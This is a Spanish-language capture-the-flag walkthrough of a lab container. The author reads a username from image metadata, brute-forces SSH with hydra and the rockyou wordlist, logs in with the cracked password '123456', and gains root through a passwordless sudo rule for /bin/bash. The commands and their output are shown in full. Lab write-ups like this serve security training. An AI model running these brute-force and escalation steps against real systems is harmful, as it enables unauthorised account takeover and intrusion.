![[Pasted image 20250514115027.png]]

De momento solo veo una imagen de kinder sorpresa, haber que puedo sacar de aqui, voy a probar a ver la imagen descargada, no tengo mas lugares pon donde buscar

```bash
┌──(root㉿38095a406ad0)-[/home]
└─# ls
chat-gonza.txt  imagen.jpeg  pendientes.txt

┌──(root㉿38095a406ad0)-[/home]
└─# exif imagen.jpeg 
bash: exif: command not found

┌──(root㉿38095a406ad0)-[/home]
└─# exiftool imagen.jpeg 
ExifTool Version Number         : 13.25
File Name                       : imagen.jpeg
Directory                       : .
File Size                       : 19 kB
File Modification Date/Time     : 2025:05:14 09:53:53+00:00
File Access Date/Time           : 2025:05:14 09:53:53+00:00
File Inode Change Date/Time     : 2025:05:14 09:57:04+00:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
XMP Toolkit                     : Image::ExifTool 12.76
Description                     : ---------- User: borazuwarah ----------
Title                           : ---------- Password:  ----------
Image Width                     : 455
Image Height                    : 455
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 455x455
Megapixels                      : 0.207


```

```bash
┌──(root㉿38095a406ad0)-[/home]
└─# hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.3
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-14 09:57:57
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.3:22/
[22][ssh] host: 172.17.0.3   login: borazuwarah   password: 123456
^C
```

Hacemos un Hydra y encontramos la contraseña del usuario

```bash
┌──(root㉿38095a406ad0)-[/home]
└─# ssh borazuwarah@172.17.0.3
The authenticity of host '172.17.0.3 (172.17.0.3)' cant be established.
ED25519 key fingerprint is SHA256:O4p1roi1VxgJcCkT8eG0qxAP8LkcGMNNNg1H/7HISvg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.3' (ED25519) to the list of known hosts.
borazuwarah@172.17.0.3s password: 
Linux 121b5de017c6 6.14.5-300.fc42.x86_64 #1 SMP PREEMPT_DYNAMIC Fri May  2 14:16:46 UTC 2025 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
borazuwarah@121b5de017c6:~$ ls
borazuwarah@121b5de017c6:~$ sudo -l
Matching Defaults entries for borazuwarah on 121b5de017c6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User borazuwarah may run the following commands on 121b5de017c6:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/bash
borazuwarah@121b5de017c6:~$ sudo /bin/bash
root@121b5de017c6:/home/borazuwarah# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
root@121b5de017c6:/home/borazuwarah# 


```

La vulnerabilidad que habia aqui era que tenia para ejecutar `/bin/bash` con permisos de sudo